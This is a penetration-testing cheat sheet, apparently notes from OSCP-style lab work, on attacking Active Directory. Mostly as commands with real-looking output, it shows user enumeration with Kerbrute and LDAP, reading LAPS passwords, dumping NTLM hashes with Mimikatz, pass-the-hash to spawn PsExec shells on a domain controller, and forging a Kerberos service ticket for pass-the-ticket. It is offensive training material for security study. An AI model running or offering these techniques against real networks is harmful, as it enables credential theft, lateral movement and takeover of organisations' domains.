# Active Directory and LDAP

![](https://mayfly277.github.io/assets/blog/pentest_ad_dark.svg)
[Source](https://mayfly277.github.io/assets/blog/pentest_ad_dark.svg)

## Kerbrute

Site: https://github.com/ropnop/kerbrute

```sh
┌──(grenierdev㉿kali)-[~/…/OSCP-EXAM-REPORT/Lab/Targets/10.11.1.20]
└─$ /opt/kerbrute/dist/kerbrute_linux_amd64 userenum -d svcorp.com --dc 10.11.1.20 -t 1 /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt | tee kerbruteenum.txt
```

## NET
```sh
# Enumerate domain users
> net user /domain

# Properties of a user
> net user jeff_admin /domain

# Enumerate domain groups
> net group /domain
```

## LDAP

Cheatsheet: https://ldapwiki.com/wiki/Active%20Directory%20Computer%20Related%20LDAP%20Query

### From outide
```sh
┌──(grenierdev㉿kali)-[~/…/OSCP-EXAM-REPORT/Lab/Targets/10.11.1.20]
└─$ python3         
Python 3.9.10 (main, Jan 16 2022, 17:12:18) 
[GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import ldap3
>>> server = ldap3.Server("10.11.1.20", get_info=ldap3.ALL, use_ssl=False)
>>> con = ldap3.Connection(server)
>>> con.bind()
True
>>> server.info
DSA info (from DSE):
  Supported LDAP versions: 3, 2
  Naming contexts: 
    DC=svcorp,DC=com
    CN=Configuration,DC=svcorp,DC=com
    CN=Schema,CN=Configuration,DC=svcorp,DC=com
    DC=DomainDnsZones,DC=svcorp,DC=com
    DC=ForestDnsZones,DC=svcorp,DC=com
  Supported controls: 
  ...

>>> con.search(search_base="DC=svcorp,dc=com", search_filter="(objectClass=*)", search_scope="SUBTREE", attributes="*")
True
>>> con.entries
...
```

### From within with ActiveDirectory Module
```sh
# Enumerate domain users
PS C:\> Get-ADUser

# Enumerate domain groups
PS C:\> Get-ADGroup

# Enumerate domain computers
PS C:\> Get-ADComputer -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
```

### From within
```sh
# Enumerate domain users
PS C:\> $as = [adsisearcher]"(objectClass=User)"
PS C:\> $as.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC01.corp.com/DC=corp,DC=com", "corp.com\offsec", "lab")
PS C:\> $as.FindAll()

# Enumerate domain groups
PS C:\> $as = [adsisearcher]"(objectCategory=Group)"

# Enumerate domain admins
PS C:\> $as = [adsisearcher]"(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=com)"

# Enumerate computers
PS C:\> $as = [adsisearcher]"(objectCategory=computer)"

# Enumerate computers with OS
PS C:\> $as = [adsisearcher]"(&(objectCategory=computer)(operatingSystem=Windows 10*))"

# Enumerate memberOf in chain/recursive (requires Distringuished Names)
PS C:\> $as = [adsisearcher]"(memberOf:1.2.840.113556.1.4.1941:=CN=Secret_Group,OU=CorpGroups,DC=corp,DC=com)"
```

## Mimikatz
```sh
PS C:\Tools\active_directory> .\mimikatz.exe

  .#####.   mimikatz 2.1.1 (x86) built on Mar 25 2018 21:00:57
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 677849 (00000000:000a57d9)
Session           : RemoteInteractive from 2
User Name         : offsec
Domain            : CLIENT251
Logon Server      : CLIENT251
Logon Time        : 4/15/2022 10:49:45 AM
SID               : S-1-5-21-1375711201-1277040102-1320212398-1003
        msv :
         [00000003] Primary
         * Username : offsec
         * Domain   : CLIENT251
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
        tspkg :
        wdigest :
         * Username : offsec
         * Domain   : CLIENT251
         * Password : (null)
        kerberos :
         * Username : offsec
         * Domain   : CLIENT251
         * Password : (null)
        ssp :
        credman :
...
		
mimikatz # sekurlsa::tickets

Authentication Id : 0 ; 677849 (00000000:000a57d9)
Session           : RemoteInteractive from 2
User Name         : offsec
Domain            : CLIENT251
Logon Server      : CLIENT251
Logon Time        : 4/15/2022 10:49:45 AM
SID               : S-1-5-21-1375711201-1277040102-1320212398-1003

         * Username : offsec
         * Domain   : CLIENT251
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
...
```

## Kerberoast

Site: https://github.com/nidem/kerberoast

> Kerberoast is a series of tools for attacking MS Kerberos implementations. Below is a brief overview of what each tool does.

## Overpass The Hash

Only works if SMB + File & Printing Sharing. Attack can gain a Kerberos Ticket Granting Ticket or service ticket, which grants the attacker access to another machine or service as that user.

```sh
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1082525 (00000000:0010849d)
Session           : Interactive from 0
User Name         : jeff_admin
Domain            : corp
Logon Server      : DC01
Logon Time        : 4/16/2022 10:46:24 AM
SID               : S-1-5-21-4038953314-3014849035-1274281563-1104
        msv :
         [00000003] Primary
         * Username : jeff_admin
         * Domain   : corp
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
         * DPAPI    : d9f056fbcdea51fa473f063395fd3559
        tspkg :
        wdigest :
         * Username : jeff_admin
         * Domain   : corp
         * Password : (null)
        kerberos :
         * Username : jeff_admin
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:PowerShell.exe

mimikatz #

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
corp\offsec
PS C:\Windows\system32> net use \\dc01
The command completed successfully.

PS C:\Tools\active_directory> .\PsExec.exe \\dc01 cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 172.16.247.5
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.247.254

Tunnel adapter isatap.{8B1CC296-E680-469F-9067-4463B8DE5B9F}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```

## Pass The Ticket

```sh
PS C:\Tools\active_directory> whoami /user

USER INFORMATION
----------------

User Name   SID
=========== ==============================================
corp\offsec S-1-5-21-4038953314-3014849035-1274281563-1103

mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::list

mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
User      : offsec
Domain    : corp.com (CORP)
SID       : S-1-5-21-4038953314-3014849035-1274281563
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: e2b475c11da2a0748290d87aa966c327 - rc4_hmac_nt
Service   : HTTP
Target    : CorpWebServer.corp.com
Lifetime  : 4/16/2022 11:09:27 AM ; 4/13/2032 11:09:27 AM ; 4/13/2032 11:09:27 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'offsec @ corp.com' successfully submitted for current session

mimikatz # kerberos::list

[00000000] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 4/16/2022 11:09:27 AM ; 4/13/2032 11:09:27 AM ; 4/13/2032 11:09:27 AM
   Server Name       : HTTP/CorpWebServer.corp.com @ corp.com
   Client Name       : offsec @ corp.com
   Flags 40a00000    : pre_authent ; renewable ; forwardable ;

```